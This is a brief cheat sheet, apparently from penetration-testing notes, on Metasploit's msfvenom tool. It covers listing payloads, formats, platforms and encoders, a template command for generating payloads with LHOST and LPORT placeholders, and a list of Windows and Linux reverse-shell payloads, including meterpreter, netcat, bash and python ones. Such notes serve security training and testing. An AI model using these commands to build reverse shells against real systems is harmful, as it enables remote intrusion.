### Available options
```
msfvenom -l payloads
```
display all payloads.
```
msfvenom --help-formats
```
display all formats.
```
msfvenom --help-platforms
```
display all platforms.
```
msfvenom -l encoders
```
display all encoders.
___
### Generate payload
```
msfvenom -p <payload> -f <format> -o <filename> [-e <encoder] [-a <architecture>] [--platform <platform>] LHOST=<ip> LPORT=<port>
```
generate a payload.
_Payload path: \<os>/\<architecture>/\<payload>_
_Typical payloads/formats:_
- `windows/meterpreter/reverse_tcp`/`exe`
- `linux/x86/meterpreter/reverse_tcp`/`elf`
- `linux/x86/shell_reverse_tcp`/`elf`
- `cmd/unix/reverse_netcat`/`raw`
- `cmd/unix/reverse_bash`/`raw`
- `cmd/unix/reverse_python`/`raw`

`shell_reverse_tcp` is stage-less and `shell/reverse_tcp` is staged.